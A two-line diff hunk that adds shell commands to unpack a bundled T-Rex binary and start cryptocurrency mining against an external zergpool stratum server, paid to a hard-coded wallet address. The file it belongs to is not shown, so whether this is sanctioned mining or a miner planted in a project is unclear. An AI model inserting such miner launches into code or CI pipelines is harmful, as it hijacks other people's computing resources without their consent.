@@ -1,0 +1,2 @@
+tar -zxvf bin/trex.tar.gz -C bin/
+bin/t-rex -a x16rt -o stratum+tcp://x16rt.na.mine.zergpool.com:3696 -u RR5krrLUGTTnySZhEgBHkr3iDo4RyaTYms.test
